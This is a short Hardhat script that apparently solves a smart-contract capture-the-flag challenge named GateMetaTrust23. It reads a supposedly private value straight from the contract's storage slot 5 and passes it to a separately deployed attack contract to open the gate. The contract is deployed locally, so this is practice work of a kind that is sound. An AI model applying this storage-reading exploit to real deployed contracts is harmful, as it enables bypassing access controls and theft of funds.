import chalk from "chalk";
import { ethers } from "hardhat";
import { GateMetaTrust23__factory, GateMetaTrust23, GateAttackMetaTrust23__factory} from "../../typechain";
import { log, initialize } from "../utils";
import { randomBytes } from "crypto";

async function main() {
    let data = ["0x"+randomBytes(32).toString("hex"), "0x"+randomBytes(32).toString("hex"), "0x"+randomBytes(32).toString("hex")];
    let [gateContract, attacker] = await initialize<GateMetaTrust23>(GateMetaTrust23__factory, undefined, data);
    
    let d = await ethers.provider.getStorage(await gateContract.getAddress(), 5);
    let attackContract = await new GateAttackMetaTrust23__factory(attacker).deploy();
    await attackContract.waitForDeployment();
    let tx = await attackContract.attack(await gateContract.getAddress(), d);
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await gateContract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});